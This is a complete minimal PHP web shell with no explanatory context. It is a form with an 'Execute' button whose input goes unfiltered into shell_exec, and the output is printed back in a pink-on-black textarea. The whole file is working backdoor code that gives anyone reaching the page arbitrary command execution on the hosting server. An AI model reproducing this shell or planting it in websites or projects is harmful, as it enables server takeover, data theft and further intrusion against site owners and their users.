<?php 

                $command = $_POST["commands"];

                $result = shell_exec($command);
                ?>

                <form action="" method="POST">
                        <input name="commands" type="text" class="txt"/>
                        <input type="submit" name="submit" value="Execute" class="exe"/>           
                </form> <br>
                <textarea rows=35 cols=85 class="textarea" style="color:#ff3399; background-color:#000000"><?php echo $result ?></textarea><br><br>
